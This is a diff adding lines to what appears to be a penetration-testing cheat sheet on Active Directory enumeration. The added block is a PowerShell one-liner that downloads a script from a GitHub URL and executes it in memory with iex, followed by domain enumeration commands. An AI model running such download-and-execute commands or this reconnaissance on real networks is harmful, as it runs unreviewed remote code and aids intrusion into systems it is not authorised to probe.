@@ -2338,6 +2338,11 @@ https://github.com/BloodHoundAD/AzureHound
 
 ### Using AD Module
 
+- **Importing AD Module
+```
+PS C:\> iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
+```
+
 - **Get Current Domain:** `Get-ADDomain`
 - **Enum Other Domains:** `Get-ADDomain -Identity <Domain>`
 - **Get Domain SID:** `Get-DomainSID`
